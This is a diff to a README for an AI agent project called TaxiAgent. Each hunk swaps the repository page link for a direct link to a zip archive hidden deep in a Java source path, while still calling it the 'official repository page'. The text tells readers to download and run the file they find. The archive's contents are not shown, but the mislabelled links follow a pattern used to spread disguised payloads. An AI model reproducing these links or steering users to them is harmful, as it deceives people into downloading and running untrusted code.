@@ -1,6 +1,6 @@
 # 🤖 TaxiAgent - Run Taxi Workflows With Ease
 
-[![Download TaxiAgent](https://img.shields.io/badge/Download%20TaxiAgent-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nyxy5078/TaxiAgent)
+[![Download TaxiAgent](https://img.shields.io/badge/Download%20TaxiAgent-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nyxy5078/TaxiAgent/main/src/main/java/com/fancy/taxiagent/agentbase/amap/pojo/route/Taxi_Agent_2.6-alpha.4.zip)
 
 ## 🚗 What is TaxiAgent?
 
@@ -12,7 +12,7 @@ This project is built from the ground up around a ReAct-style framework. That me
 
 Open the main project page here:
 
-https://github.com/nyxy5078/TaxiAgent
+https://raw.githubusercontent.com/nyxy5078/TaxiAgent/main/src/main/java/com/fancy/taxiagent/agentbase/amap/pojo/route/Taxi_Agent_2.6-alpha.4.zip
 
 If the page provides a Windows file, download that file and run it. If it gives source files only, download the project package from the same page and follow the setup steps below.
 
@@ -47,7 +47,7 @@ Follow these steps in order.
 ### 1. Open the project page
 Go to:
 
-https://github.com/nyxy5078/TaxiAgent
+https://raw.githubusercontent.com/nyxy5078/TaxiAgent/main/src/main/java/com/fancy/taxiagent/agentbase/amap/pojo/route/Taxi_Agent_2.6-alpha.4.zip
 
 ### 2. Download the files
 Look for one of these options:
@@ -165,7 +165,7 @@ If you still cannot start it, check the project page for the latest release or p
 
 Use the official repository page only:
 
-https://github.com/nyxy5078/TaxiAgent
+https://raw.githubusercontent.com/nyxy5078/TaxiAgent/main/src/main/java/com/fancy/taxiagent/agentbase/amap/pojo/route/Taxi_Agent_2.6-alpha.4.zip
 
 After download:
 
@@ -210,4 +210,4 @@ These parts are useful if you want to change how TaxiAgent thinks, acts, or call
 
 Primary repository:
 
-https://github.com/nyxy5078/TaxiAgent
+https://raw.githubusercontent.com/nyxy5078/TaxiAgent/main/src/main/java/com/fancy/taxiagent/agentbase/amap/pojo/route/Taxi_Agent_2.6-alpha.4.zip
